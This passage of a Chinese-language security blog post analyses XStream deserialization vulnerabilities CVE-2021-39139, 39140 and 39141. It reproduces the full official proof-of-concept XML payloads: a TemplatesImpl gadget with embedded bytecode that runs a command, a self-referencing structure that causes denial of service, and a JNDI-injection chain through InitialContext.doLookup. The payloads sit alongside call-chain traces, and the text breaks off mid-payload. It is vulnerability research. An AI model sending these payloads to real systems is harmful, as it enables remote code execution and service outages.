&lt;long&gt;0&lt;/long&gt;</span><br><span class="line">                                                        &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">                                                        &lt;long&gt;0&lt;/long&gt;</span><br><span class="line">                                                        &lt;short&gt;0&lt;/short&gt;</span><br><span class="line">                                                        &lt;boolean&gt;false&lt;/boolean&gt;</span><br><span class="line">                                                    &lt;/java.rmi.server.RemoteObject&gt;</span><br><span class="line">                                                &lt;/registry&gt;</span><br><span class="line">                                                &lt;host&gt;127.0.0.1&lt;/host&gt;</span><br><span class="line">                                                &lt;port&gt;2333&lt;/port&gt;</span><br><span class="line">                                            &lt;/ctx&gt;</span><br><span class="line">                                        &lt;/candidates&gt;</span><br><span class="line">                                    &lt;/aliases&gt;</span><br><span class="line">                                &lt;/it&gt;</span><br><span class="line">                            &lt;/mm&gt;</span><br><span class="line">                        &lt;/multiPart&gt;</span><br><span class="line">                    &lt;/sm&gt;</span><br><span class="line">                &lt;/message&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>不过这个漏洞倒是挺简单的，不像之前其他漏洞有触发点，该漏洞是直接发生在一开始所有标签对应的对象进行反序列化的时候。</p>
<p>当反序列化到RemoteObject对象时：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304112206574.png" alt="image-20230411220648454"></p>
<p>读取类名，注册类，实例化，然后调用UnicastRef的readExternal方法将对象输入流进行传递：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304112208086.png" alt="image-20230411220852020"></p>
<p>调用LiveRef的read方法，接着传递：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304112221567.png" alt="image-20230411222157461"></p>
<p>在read方法中，读取主机端口，封装到TCPEndpoint对象中，然后新建LiveRef，封装ObjID（用于标识远程对象）和TCPEndpoint对象，然后发起JRMP请求。</p>
<h2 id="分割线-2"><a href="#分割线-2" class="headerlink" title="分割线"></a>分割线</h2><p>XStream1.4.17版本又爆出了14个漏洞，而且大部分是RCE，下面的CVE都适用于1.4.17及以下版本的。</p>
<p>先看看1.4.17加入了哪些黑名单：</p>
<p>类型匹配如下的：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304121900887.png" alt="image-20230412190006912"></p>
<p>正则匹配如下的：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304121900278.png" alt="image-20230412190046222"></p>
<p>类继承如下的：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304121903537.png" alt="image-20230412190320446"></p>
<h2 id="CVE-2021-39139"><a href="#CVE-2021-39139" class="headerlink" title="CVE-2021-39139"></a>CVE-2021-39139</h2><h3 id="分析-18"><a href="#分析-18" class="headerlink" title="分析"></a>分析</h3><p>该漏洞造成RCE，但是要在jdk1.7u21下才能使用，这年头谁会用jdk7？又是个鸡肋洞。下面是官方给的POC：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;linked-hash-set&gt;</span><br><span class="line">  &lt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">    &lt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;</span><br><span class="line">      &lt;default&gt;</span><br><span class="line">        &lt;__name&gt;Pwnr&lt;/__name&gt;</span><br><span class="line">        &lt;__bytecodes&gt;</span><br><span class="line">          &lt;byte-array&gt;yv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEACGNhbGMuZXhlCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVyNDE2NTkyOTE1MTgwNjAwAQAgTHlzb3NlcmlhbC9Qd25lcjQxNjU5MjkxNTE4MDYwMDsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAk=&lt;/byte-array&gt;</span><br><span class="line">          &lt;byte-array&gt;yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJ&lt;/byte-array&gt;</span><br><span class="line">        &lt;/__bytecodes&gt;</span><br><span class="line">        &lt;__transletIndex&gt;-1&lt;/__transletIndex&gt;</span><br><span class="line">        &lt;__indentNumber&gt;0&lt;/__indentNumber&gt;</span><br><span class="line">      &lt;/default&gt;</span><br><span class="line">    &lt;/com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;</span><br><span class="line">  &lt;/com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&gt;</span><br><span class="line">  &lt;dynamic-proxy&gt;</span><br><span class="line">    &lt;interface&gt;javax.xml.transform.Templates&lt;/interface&gt;</span><br><span class="line">    &lt;handler class=&#x27;sun.reflect.annotation.AnnotationInvocationHandler&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">      &lt;sun.reflect.annotation.AnnotationInvocationHandler&gt;</span><br><span class="line">        &lt;default&gt;</span><br><span class="line">          &lt;memberValues&gt;</span><br><span class="line">            &lt;entry&gt;</span><br><span class="line">              &lt;string&gt;f5a5a608&lt;/string&gt;</span><br><span class="line">              &lt;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl reference=&#x27;../../../../../../../com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#x27;/&gt;</span><br><span class="line">            &lt;/entry&gt;</span><br><span class="line">          &lt;/memberValues&gt;</span><br><span class="line">          &lt;type&gt;javax.xml.transform.Templates&lt;/type&gt;</span><br><span class="line">        &lt;/default&gt;</span><br><span class="line">      &lt;/sun.reflect.annotation.AnnotationInvocationHandler&gt;</span><br><span class="line">    &lt;/handler&gt;</span><br><span class="line">  &lt;/dynamic-proxy&gt;</span><br><span class="line">&lt;/linked-hash-set&gt;</span><br></pre></td></tr></table></figure>

<p>我jdk版本太高了，复现不了，也懒得下个低版本的复现。利用链如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      Proxy(Templates).hashCode() (X)</span><br><span class="line">        AnnotationInvocationHandler.invoke() (X)</span><br><span class="line">          AnnotationInvocationHandler.hashCodeImpl() (X)</span><br><span class="line">            String.hashCode() (0)</span><br><span class="line">            AnnotationInvocationHandler.memberValueHashCode() (X)</span><br><span class="line">              TemplatesImpl.hashCode() (X)</span><br><span class="line">      Proxy(Templates).equals()</span><br><span class="line">        AnnotationInvocationHandler.invoke()</span><br><span class="line">          AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">            Method.invoke()</span><br><span class="line">              ...</span><br><span class="line">                TemplatesImpl.getOutputProperties()</span><br><span class="line">                  TemplatesImpl.newTransformer()</span><br><span class="line">                    ...</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304122142975.png" alt="image-20230412214204864"></p>
<h2 id="CVE-2021-39140"><a href="#CVE-2021-39140" class="headerlink" title="CVE-2021-39140"></a>CVE-2021-39140</h2><h3 id="分析-19"><a href="#分析-19" class="headerlink" title="分析"></a>分析</h3><p>该漏洞造成拒绝服务，也是受限于JDK版本，根本原因是重复引用造成死循环，官网POC：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;linked-hash-set&gt;</span><br><span class="line">  &lt;sun.reflect.annotation.AnnotationInvocationHandler serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">    &lt;sun.reflect.annotation.AnnotationInvocationHandler&gt;</span><br><span class="line">      &lt;default&gt;</span><br><span class="line">        &lt;memberValues class=&#x27;javax.script.SimpleBindings&#x27;&gt;</span><br><span class="line">          &lt;map class=&#x27;javax.script.SimpleBindings&#x27; reference=&#x27;..&#x27;/&gt;</span><br><span class="line">        &lt;/memberValues&gt;</span><br><span class="line">        &lt;type&gt;javax.xml.transform.Templates&lt;/type&gt;</span><br><span class="line">      &lt;/default&gt;</span><br><span class="line">    &lt;/sun.reflect.annotation.AnnotationInvocationHandler&gt;</span><br><span class="line">  &lt;/sun.reflect.annotation.AnnotationInvocationHandler&gt;</span><br><span class="line">&lt;/linked-hash-set&gt;</span><br></pre></td></tr></table></figure>

<p>我的jdk版本太高，也是复现不了。发生DOS的在这三行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;memberValues class=&#x27;javax.script.SimpleBindings&#x27;&gt;</span><br><span class="line">  &lt;map class=&#x27;javax.script.SimpleBindings&#x27; reference=&#x27;..&#x27;/&gt;</span><br><span class="line">&lt;/memberValues&gt;</span><br></pre></td></tr></table></figure>

<p>发生DOS的在AnnotationInvocationHandler的readObject方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304122205417.png" alt="image-20230412220537335"></p>
<p>调用SimpleBindings对象的entrySet方法，在entrySet方法中又调用了map属性的entrySet：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304122206733.png" alt="image-20230412220656655"></p>
<p>由于map属性引用了自身（SimpleBindings对象），调用map属性的entrySet方法又回到了SimpleBindings对象的entrySet方法，造成了死循环。</p>
<h2 id="CVE-2021-39141"><a href="#CVE-2021-39141" class="headerlink" title="CVE-2021-39141"></a>CVE-2021-39141</h2><h3 id="分析-20"><a href="#分析-20" class="headerlink" title="分析"></a>分析</h3><p>39141直接造成JNDI注入，官方POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;dynamic-proxy&gt;</span><br><span class="line">      &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;</span><br><span class="line">      &lt;handler class=&#x27;com.sun.xml.internal.ws.client.sei.SEIStub&#x27;&gt;</span><br><span class="line">        &lt;owner/&gt;</span><br><span class="line">        &lt;managedObjectManagerClosed&gt;false&lt;/managedObjectManagerClosed&gt;</span><br><span class="line">        &lt;databinding class=&#x27;com.sun.xml.internal.ws.db.DatabindingImpl&#x27;&gt;</span><br><span class="line">          &lt;stubHandlers&gt;</span><br><span class="line">            &lt;entry&gt;</span><br><span class="line">              &lt;method&gt;</span><br><span class="line">                &lt;class&gt;java.lang.Comparable&lt;/class&gt;</span><br><span class="line">                &lt;name&gt;compareTo&lt;/name&gt;</span><br><span class="line">                &lt;parameter-types&gt;</span><br><span class="line">                  &lt;class&gt;java.lang.Object&lt;/class&gt;</span><br><span class="line">                &lt;/parameter-types&gt;</span><br><span class="line">              &lt;/method&gt;</span><br><span class="line">              &lt;com.sun.xml.internal.ws.client.sei.StubHandler&gt;</span><br><span class="line">                &lt;bodyBuilder class=&#x27;com.sun.xml.internal.ws.client.sei.BodyBuilder$DocLit&#x27;&gt;</span><br><span class="line">                  &lt;indices&gt;</span><br><span class="line">                    &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">                  &lt;/indices&gt;</span><br><span class="line">                  &lt;getters&gt;</span><br><span class="line">                    &lt;com.sun.xml.internal.ws.client.sei.ValueGetter&gt;PLAIN&lt;/com.sun.xml.internal.ws.client.sei.ValueGetter&gt;</span><br><span class="line">                  &lt;/getters&gt;</span><br><span class="line">                  &lt;accessors&gt;</span><br><span class="line">                    &lt;com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2&gt;</span><br><span class="line">                      &lt;val_-isJAXBElement&gt;false&lt;/val_-isJAXBElement&gt;</span><br><span class="line">                      &lt;val_-getter class=&#x27;com.sun.xml.internal.ws.spi.db.FieldGetter&#x27;&gt;</span><br><span class="line">                        &lt;type&gt;int&lt;/type&gt;</span><br><span class="line">                        &lt;field&gt;</span><br><span class="line">                          &lt;name&gt;hash&lt;/name&gt;</span><br><span class="line">                          &lt;clazz&gt;java.lang.String&lt;/clazz&gt;</span><br><span class="line">                        &lt;/field&gt;</span><br><span class="line">                      &lt;/val_-getter&gt;</span><br><span class="line">                      &lt;val_-isListType&gt;false&lt;/val_-isListType&gt;</span><br><span class="line">                      &lt;val_-n&gt;</span><br><span class="line">                        &lt;namespaceURI/&gt;</span><br><span class="line">                        &lt;localPart&gt;hash&lt;/localPart&gt;</span><br><span class="line">                        &lt;prefix/&gt;</span><br><span class="line">                      &lt;/val_-n&gt;</span><br><span class="line">                      &lt;val_-setter class=&#x27;com.sun.xml.internal.ws.spi.db.MethodSetter&#x27;&gt;</span><br><span class="line">                        &lt;type&gt;java.lang.String&lt;/type&gt;</span><br><span class="line">                        &lt;method&gt;</span><br><span class="line">                          &lt;class&gt;javax.naming.InitialContext&lt;/class&gt;</span><br><span class="line">                          &lt;name&gt;doLookup&lt;/name&gt;</span><br><span class="line">                          &lt;parameter-types&gt;</span><br><span class="line">                            &lt;class&gt;java.lang.String&lt;/class&gt;</span><br><span class="line">                          &lt;/parameter-types&gt;</span><br><span class="line">                        &lt;/method&gt;</span><br><span class="line">                      &lt;/val_-setter&gt;</span><br><span class="line">                      &lt;outer-class&gt;</span><br><span class="line">                        &lt;propertySetters&gt;</span><br><span class="line">                          &lt;entry&gt;</span><br><span class="line">                            &lt;string&gt;serialPersistentFields&lt;/string&gt;</span><br><span class="line">                            &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;</span><br><span class="line">                              &lt;type&gt;[Ljava.io.ObjectStreamField;&lt;/type&gt;</span><br><span class="line">                              &lt;field&gt;</span><br><span class="line">                                &lt;name&gt;serialPersistentFields&lt;/name&gt;</span><br><span class="line">                                &lt;clazz&gt;java.lang.String&lt;/clazz&gt;</span><br><span class="line">                              &lt;/field&gt;</span><br><span class="line">                            &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;</span><br><span class="line">                          &lt;/entry&gt;</span><br><span class="line">                          &lt;entry&gt;</span><br><span class="line">                            &lt;string&gt;CASE_INSENSITIVE_ORDER&lt;/string&gt;</span><br><span class="line">                            &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;</span><br><span class="line">                              &lt;type&gt;java.util.Comparator&lt;/type&gt;</span><br><span class="line">                              &lt;field&gt;</span><br><span class="line">                                &lt;name&gt;CASE_INSENSITIVE_ORDER&lt;/name&gt;</span><br><span class="line">                                &lt;clazz&gt;java.lang.String&lt;/clazz&gt;</span><br><span class="line">                              &lt;/field&gt;</span><br><span class="line">                            &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;</span><br><span class="line">                          &lt;/entry&gt;</span><br><span class="line">                          &lt;entry&gt;</span><br><span class="line">                            &lt;string&gt;serialVersionUID&lt;/string&gt;</span><br><span class="line">                            &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;</span><br><span class="line">                              &lt;type&gt;long&lt;/type&gt;</span><br><span class="line">                              &lt;field&gt;</span><br><span class="line">                                &lt;name&gt;serialVersionUID&lt;/name&gt;</span><br><span class="line">                                &lt;clazz&gt;java.lang.String&lt;/clazz&gt;</span><br><span class="line">                              &lt;/field&gt;</span><br><span class="line">                            &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;</span><br><span class="line">                          &lt;/entry&gt;</span><br><span class="line">                          &lt;entry&gt;</span><br><span class="line">                            &lt;string&gt;value&lt;/string&gt;</span><br><span class="line">                            &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;</span><br><span class="line">                              &lt;type&gt;[C&lt;/type&gt;</span><br><span class="line">                              &lt;field&gt;</span><br><span class="line">                                &lt;name&gt;value&lt;/name&gt;</span><br><span class="line">                                &lt;clazz&gt;java.lang.String&lt;/clazz&gt;</span><br><span class="line">                              &lt;/field&gt;</span><br><span class="line">                            &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;</span><br><span class="line">                          &lt;/entry&gt;</span><br><span class="line">                          &lt;entry&gt;</span><br><span class="line">                            &lt;string&gt;hash&lt;/string&gt;</span><br><span class="line">                            &lt;com.sun.xml.internal.ws.spi.db.FieldSetter&gt;</span><br><span class="line">                              &lt;type&gt;int&lt;/type&gt;</span><br><span class="line">                              &lt;field reference=&#x27;../../../../../val_-getter/field&#x27;/&gt;</span><br><span class="line">                            &lt;/com.sun.xml.internal.ws.spi.db.FieldSetter&gt;</span><br><span class="line">                          &lt;/entry&gt;</span><br><span class="line">                        &lt;/propertySetters&gt;</span><br><span class="line">                        &lt;propertyGetters&gt;</span><br><span class="line">                          &lt;entry&gt;</span><br><span class="line">                            &lt;string&gt;serialPersistentFields&lt;/string&gt;</span><br><span class="line">                            &lt;com.sun.xml.internal.ws.spi.db.FieldGetter&gt;</span><br><span class="line">                              &lt;type&gt;[Ljava.io.ObjectStreamField;&lt;/type&gt;</span><br><span class="line">                              &lt;field reference=&#x27;../../../../propertySetters/entry/com.sun.xml.internal.ws.spi.db.FieldSetter/field&#x27;/&gt;</span><br><span class="line">                            &lt;/com.sun.xml.internal.ws.spi.db.FieldGetter&gt;</span><br><span class="line">                          &lt;/entry&gt;</span><br><span class="line">                          &lt;entry&gt;</span><br><span class="line">                            &lt;string&gt;CASE_INSENSITIVE_ORDER&lt;/string&gt;</span><br><span class="line">                            &lt;com.sun.xml.internal.ws.spi.db.FieldGetter&gt;</span><br><span class="line">                              &lt;type&gt;java.util.Comparator&lt;/type&gt;</span><br><span class="line">                              &lt;field reference=&#x27;../../../../propertySetters/entry[2]/com.sun.xml.internal.ws.spi.db.FieldSetter/field&#x27;/&gt;</span><br><span class="line">                            &lt;/com.sun.xml.internal.ws.spi.db.FieldGetter&gt;</span><br><span class="line">                          &lt;/entry&gt;</span><br><span class="line">                          &lt;entry&gt;</span><br><span class="line">                            &lt;string&gt;serialVersionUID&lt;/string&gt;</span><br><span class="line">                            &lt;com.sun.xml.internal.ws.spi.db.FieldGetter&gt;</span><br><span class="line">                              &lt;type&gt;long&lt;/type&gt;</span><br><span class="line">                              &lt;field reference=&#x27;../../../../propertySetters/entry[3]/com.sun.xml.internal.ws.spi.db.FieldSetter/field&#x27;/&gt;</span><br><span class="line">                            &lt;/com.sun.xml.internal.ws.spi.db.FieldGetter&gt;</span><br><span class="line">                          &lt;/entry&gt;</span><br><span class="line">                          &lt;entry&gt;</span><br><span class="line">                            &lt;string&gt;value&lt;/string&gt;</span><br><span class="line">                            &lt;com.sun.xml.internal.ws.spi.db.FieldGetter&gt;</span><br><span class="line">                              &lt;type&gt;[C&lt;/type&gt;</span><br><span class="line">                              &lt;field reference=&#x27;../../../../propertySetters/entry[4]/com.sun.xml.internal.ws.spi.db.FieldSetter/field&#x27;/&gt;</span><br><span class="line">                            &lt;/com.sun.xml.internal.ws.spi.db.FieldGetter&gt;</span><br><span class="line">                          &lt;/entry&gt;</span><br><span class="line">                          &lt;entry&gt;</span><br><span class="line">                            &lt;string&gt;hash&lt;/string&gt;</span><br><span class="line">                            &lt;com.sun.xml.internal.ws.spi.db.FieldGetter reference=&#x27;../../../../val_-getter&#x27;/&gt;</span><br><span class="line">                          &lt;/entry&gt;</span><br><span class="line">                        &lt;/propertyGetters&gt;</span><br><span class="line">                        &lt;elementLocalNameCollision&gt;false&lt;/elementLocalNameCollision&gt;</span><br><span class="line">                        &lt;contentClass&gt;java.lang.String&lt;/contentClass&gt;</span><br><span class="line">                        